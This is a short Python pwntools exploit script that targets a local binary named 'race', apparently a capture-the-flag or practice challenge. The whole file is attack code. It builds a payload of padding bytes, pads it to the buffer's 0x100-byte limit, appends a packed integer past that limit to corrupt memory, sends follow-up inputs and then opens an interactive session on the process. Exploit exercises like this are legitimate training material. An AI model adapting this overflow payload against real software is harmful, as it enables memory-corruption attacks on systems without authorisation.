from time import sleep
from pwn import *

p = process("../src/race")
context(os="linux", arch="amd64", log_level="debug")
sleep(0.2)

p.sendline("1")
p.recvuntil("content to read to buffer (max 0x100 bytes): \n")
payload = b"a" * 0x30 + b"\x40"
payload = payload.ljust(0x100, b"\x00")
payload += p32(1000)
p.send(payload)
p.sendline(str(0x31))
p.sendline(str(0x31))

p.interactive()
